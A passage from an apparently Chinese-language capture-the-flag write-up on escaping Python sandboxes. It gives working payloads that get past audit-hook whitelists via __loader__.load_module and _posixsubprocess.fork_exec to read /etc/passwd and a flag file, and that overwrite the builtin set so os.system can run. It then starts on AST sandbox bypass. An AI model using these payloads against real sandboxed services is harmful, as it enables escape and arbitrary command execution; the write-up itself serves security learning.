class=&#34;literal&#34;&gt;None&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __uid_object: SupportsIndex | &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __child_umask: &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __preexec_fn: &lt;span class=&#34;type&#34;&gt;Callable&lt;/span&gt;[[], &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;],&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;    __allow_vfork: &lt;span class=&#34;built_in&#34;&gt;bool&lt;/span&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) -&amp;gt; &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;: ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;__process_args&lt;/code&gt; : 传递给新进程的命令行参数，通常为程序路径及其参数的列表。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__executable_list&lt;/code&gt; : 可执行程序路径的列表。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__close_fds&lt;/code&gt; : 如果设置为 True，则在新进程中关闭所有的文件描述符。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__fds_to_keep&lt;/code&gt; : 一个元组，表示在新进程中需要保持打开的文件描述符的列表。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__cwd_obj&lt;/code&gt; : 新进程的工作目录。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__env_list&lt;/code&gt; : 环境变量列表，它是键和值的序列，例如：[“PATH=/usr/bin”, “HOME=/home/user”]。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__p2cread, __p2cwrite, __c2pred, __c2pwrite, __errread, __errwrite&lt;/code&gt; : 这些是文件描述符，用于在父子进程间进行通信。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__errpipe_read, __errpipe_write&lt;/code&gt; : 这两个文件描述符用于父子进程间的错误通信。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__restore_signals&lt;/code&gt; : 如果设置为 1，则在新创建的子进程中恢复默认的信号处理。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__call_setsid&lt;/code&gt; : 如果设置为 1，则在新进程中创建新的会话。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__pgid_to_set&lt;/code&gt; : 设置新进程的进程组 ID。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__gid_object, __groups_list, __uid_object&lt;/code&gt; : 这些参数用于设置新进程的用户 ID 和组 ID。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__child_umask&lt;/code&gt; : 设置新进程的 umask。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__preexec_fn&lt;/code&gt; : 在新进程中执行的函数，它会在新进程的主体部分执行之前调用。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__allow_vfork&lt;/code&gt; : 如果设置为 True，则在可能的情况下使用 vfork 而不是 fork。vfork 是一个更高效的 fork，但是使用 vfork 可能会有一些问题 。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面是一个最小化示例:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; _posixsubprocess&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_posixsubprocess.fork_exec([&lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/cat&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;], [&lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/cat&amp;quot;&lt;/span&gt;], &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;, (), &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, *(os.pipe()), &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;,&lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;结合上面的  &lt;code&gt;__loader__.load_module(fullname)&lt;/code&gt;  可以得到最终的 payload:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__loader__.load_module(&lt;span class=&#34;string&#34;&gt;&amp;#x27;_posixsubprocess&amp;#x27;&lt;/span&gt;).fork_exec([&lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/cat&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;], [&lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/cat&amp;quot;&lt;/span&gt;], &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;, (), &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, *(__loader__.load_module(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;).pipe()), &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;,&lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;可以看到全程触发了  &lt;code&gt;builtins.input/result&lt;/code&gt; , compile, exec 三个 hook, 这些 hook 的触发都是因为 input, compile, exec 函数而触发的， &lt;code&gt;__loader__.load_module&lt;/code&gt;  和  &lt;code&gt;_posixsubprocess&lt;/code&gt;  都没有触发.&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Shell&#34;&gt;&lt;figure class=&#34;iseeu highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[+] builtins.input/result, (&amp;#x27;__loader__.load_module(\&amp;#x27;_posixsubprocess\&amp;#x27;).fork_exec([b&amp;quot;/bin/cat&amp;quot;,&amp;quot;/flag&amp;quot;], [b&amp;quot;/bin/cat&amp;quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\&amp;#x27;os\&amp;#x27;).pipe()), False, False,False, None, None, None, -1, None, False)&amp;#x27;,)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] compile, (b&amp;#x27;__loader__.load_module(\&amp;#x27;_posixsubprocess\&amp;#x27;).fork_exec([b&amp;quot;/bin/cat&amp;quot;,&amp;quot;/flag&amp;quot;], [b&amp;quot;/bin/cat&amp;quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\&amp;#x27;os\&amp;#x27;).pipe()), False, False,False, None, None, None, -1, None, False)&amp;#x27;, &amp;#x27;&amp;lt;string&amp;gt;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] exec, (&amp;lt;code object &amp;lt;module&amp;gt; at 0x7fbecc924670, file &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1&amp;gt;,)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;__loader__load_module-导入模块&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#__loader__load_module-导入模块&#34;&gt;#&lt;/a&gt;  &lt;code&gt;__loader__.load_module&lt;/code&gt;  导入模块&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;__loader__.load_module(fullname)&lt;/code&gt;  也是 python 中用于导入模块的一个方法并且不需要导入其他任何库.&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__loader__.load_module(&lt;span class=&#34;string&#34;&gt;&amp;#x27;os&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;__loader__&lt;/code&gt;  实际上指向的是  &lt;code&gt;_frozen_importlib.BuiltinImporter&lt;/code&gt;  类，也可以通过别的方式进行获取&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Shell&#34;&gt;&lt;figure class=&#34;iseeu highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&amp;gt;&amp;gt; ().__class__.__base__.__subclasses__()[84]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;class &amp;#x27;_frozen_importlib.BuiltinImporter&amp;#x27;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&amp;gt;&amp;gt; __loader__&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;class &amp;#x27;_frozen_importlib.BuiltinImporter&amp;#x27;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&amp;gt;&amp;gt; ().__class__.__base__.__subclasses__()[84].__name__&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;BuiltinImporter&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&amp;gt;&amp;gt; [x &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; ().__class__.__base__.__subclasses__() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;BuiltinImporter&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; x.__name__][0]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;class &amp;#x27;_frozen_importlib.BuiltinImporter&amp;#x27;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;__loader__.load_module&lt;/code&gt;  也有一个缺点就是&lt;strong&gt;无法导入非内建模块&lt;/strong&gt;， 例如 socket&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Shell&#34;&gt;&lt;figure class=&#34;iseeu highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&amp;gt;&amp;gt; __loader__.load_module(&lt;span class=&#34;string&#34;&gt;&amp;#x27;socket&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Traceback (most recent call last):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &amp;quot;&amp;lt;frozen importlib._bootstrap&amp;gt;&amp;quot;, line 290, in _load_module_shim&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &amp;quot;&amp;lt;frozen importlib._bootstrap&amp;gt;&amp;quot;, line 721, in _load&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &amp;quot;&amp;lt;frozen importlib._bootstrap&amp;gt;&amp;quot;, line 676, in _load_unlocked&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &amp;quot;&amp;lt;frozen importlib._bootstrap&amp;gt;&amp;quot;, line 573, in module_from_spec&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  File &amp;quot;&amp;lt;frozen importlib._bootstrap&amp;gt;&amp;quot;, line 776, in create_module&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ImportError: &amp;#x27;socket&amp;#x27; is not a built-in module&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;篡改内置函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#篡改内置函数&#34;&gt;#&lt;/a&gt; 篡改内置函数&lt;/h4&gt;
&lt;p&gt;这道 audit hook 题还有一个解法，可以看到 WHITE_EVENT 是通过 set 函数返回的，set 函数作为一个内置函数实际上也是可以被修改的&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;WHITED_EVENTS = &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt;(&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;builtins.input&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;builtins.input/result&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;exec&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;compile&amp;#x27;&lt;/span&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;比如我们将 set 函数修改为固定返回一个包含了 os.system 函数的列表&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__builtins__.&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x: [&lt;span class=&#34;string&#34;&gt;&amp;#x27;builtins.input&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;builtins.input/result&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;exec&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;compile&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;os.system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;这样 set 函数会固定返回带有 os.system 的列表.&lt;/p&gt;
&lt;p&gt;最终 payload:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;exec(&amp;quot;for k,v in enumerate(globals()[&amp;#x27;__builtins__&amp;#x27;]): print(k,v)&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 篡改函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exec(&amp;quot;globals()[&amp;#x27;__builtins__&amp;#x27;][&amp;#x27;set&amp;#x27;]=lambda x: [&amp;#x27;builtins.input&amp;#x27;, &amp;#x27;builtins.input/result&amp;#x27;,&amp;#x27;exec&amp;#x27;, &amp;#x27;compile&amp;#x27;, &amp;#x27;os.system&amp;#x27;]\nimport os\nos.system(&amp;#x27;cat flag2.txt&amp;#x27;)&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;其他不触发-hook-的方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#其他不触发-hook-的方式&#34;&gt;#&lt;/a&gt; 其他不触发 hook 的方式&lt;/h4&gt;
&lt;p&gt;使用  &lt;code&gt;__loader__.load_module(&#39;os&#39;)&lt;/code&gt;  是为了获取 os 模块，其实在 no builtins 利用手法中，无需导入也可以获取对应模块。例如:&lt;/p&gt;
&lt;h3 id=&#34;绕过-ast-沙箱&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过-ast-沙箱&#34;&gt;#&lt;/a&gt; 绕过 AST 沙箱&lt;/h3&gt;
&lt;p&gt;Python 的 ast 模块是一个用于处理 Python 代码抽象语法树（AST）的库。它提供了一些工具，可以让开发者轻松地检查、修改和生成 Python 代码的 AST。&lt;/p&gt;
&lt;p&gt;抽象语法树是 Python 源代码的一种树形表示形式，用于表示 Python 代码的语法结构。Python 的 ast 模块可以将 Python 代码解析为 AST，并提供了许多方法和属性，以便开发者可以访问和修改 AST 节点。&lt;/p&gt;
&lt;p&gt;以下是 ast 模块中常用的一些类和方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ast.parse(source, filename=’&lt;string&gt;’, mode=‘exec’)：将源代码解析为 AST 对象。&lt;/string&gt;&lt;/li&gt;
&lt;li&gt;ast.dump (node)：将 AST 节点转换为字符串形式输出。&lt;/li&gt;
&lt;li&gt;ast.NodeVisitor：一个基类，可以用于遍历和修改 AST 树。&lt;/li&gt;
&lt;li&gt;ast.NodeTransformer：一个基类，可以用于修改 AST 节点。&lt;/li&gt;
&lt;li&gt;ast.Module：表示 Python 模块。&lt;/li&gt;
&lt;li&gt;ast.FunctionDef：表示 Python 函数。&lt;/li&gt;
&lt;li&gt;ast.ClassDef：表示 Python 类。&lt;/li&gt;
&lt;li&gt;ast.Assign：表示 Python 的赋值语句。&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://ast.Name&#34;&gt;ast.Name &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;：表示 Python 的变量名。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;使用 ast 模块可以让开发者方便地访问和修改 Python 代码的语法结构，例如可以用它来分析 Python 代码的复杂度、检查代码的安全性、提取代码中的关键字等等。&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_43705697/article/details/130443928&#34;&gt;python ast 详解与用法 - CSDN 博客 &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;AST 沙箱会将用户的输入转化为操作码，此时字符串层面的变换基本上没用了，一般情况下考虑&lt;strong&gt;绕过 AST 黑名单&lt;/strong&gt;。例如下面的沙箱禁止了  &lt;code&gt;ast.Import|ast.ImportFrom|ast.Call&lt;/code&gt;  这三类操作，这样一来就无法导入模块和执行函数.&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Py&#34;&gt;&lt;figure class=&#34;iseeu highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span 